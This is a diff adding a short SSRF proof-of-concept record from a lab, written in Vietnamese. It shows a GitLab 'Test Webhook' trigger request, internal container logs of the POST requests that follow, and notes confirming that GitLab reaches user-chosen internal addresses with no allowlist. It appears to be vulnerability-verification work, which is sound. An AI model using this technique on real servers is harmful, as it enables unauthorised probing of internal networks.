@@ -1,0 +1,10 @@
+[PoC] Sau khi GET /root/ssrf-demo-project/hooks/1/test?trigger=push_events (kich hoat Test Webhook)
+docker logs lab33-internal-target:
+
+172.21.0.2 - - [11/Nov/2026:17:17:13 +0000] "POST /ssrf-poc-marker-1794417417 HTTP/1.1" 200 19 "-" "-"
+172.21.0.2 - - [11/Nov/2026:17:18:43 +0000] "POST /ssrf-poc-marker-1794417417 HTTP/1.1" 200 19 "-" "-"
+
+=> 172.21.0.2 la dia chi IP cua chinh container lab33-gitlab trong mang Docker noi bo.
+=> GitLab (server) da tu minh gui request POST toi dia chi noi bo theo URL nguoi dung cau hinh
+   trong webhook - xac nhan hanh vi SSRF: server thuc hien request toi dich do nguoi dung chon,
+   khong co kiem soat/allowlist nao chan dia chi noi bo.
